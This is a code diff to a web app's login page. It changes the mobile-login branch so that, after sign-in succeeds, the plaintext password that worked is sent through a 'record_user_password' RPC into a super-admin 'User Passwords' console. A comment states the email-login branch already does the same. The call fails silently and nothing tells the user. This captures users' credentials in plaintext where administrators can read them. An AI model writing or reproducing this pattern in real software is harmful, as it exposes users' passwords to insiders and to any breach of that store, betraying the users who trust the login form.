@@ -100,6 +100,7 @@ export default function LoginPage() {
         // Mobile login: resolve email → sign in server-side, then set session client-side
         let data: any = {}
         let ok = false
+        let okPassword = ''
         for (const pw of passwordCandidates) {
           const res = await fetch(`${getFunctionBase()}/.netlify/functions/login-mobile`, {
             method: 'POST',
@@ -107,7 +108,7 @@ export default function LoginPage() {
             body: JSON.stringify({ mobile: input.value, password: pw }),
           })
           data = await res.json().catch(() => ({}))
-          if (res.ok && data.access_token && data.refresh_token) { ok = true; break }
+          if (res.ok && data.access_token && data.refresh_token) { ok = true; okPassword = pw; break }
         }
 
         if (!ok) {
@@ -125,6 +126,11 @@ export default function LoginPage() {
           setLoading(false)
           return
         }
+        // Mirror the working password into the super-admin "User Passwords"
+        // console (idempotent RPC — only writes when the value is new).
+        // Best-effort; never affects login. The email-login branch already
+        // gets this via loginClient.
+        try { await supabase.rpc('record_user_password', { p_password: okPassword } as any) } catch { /* non-fatal */ }
         router.push('/dashboard')
         return
       }
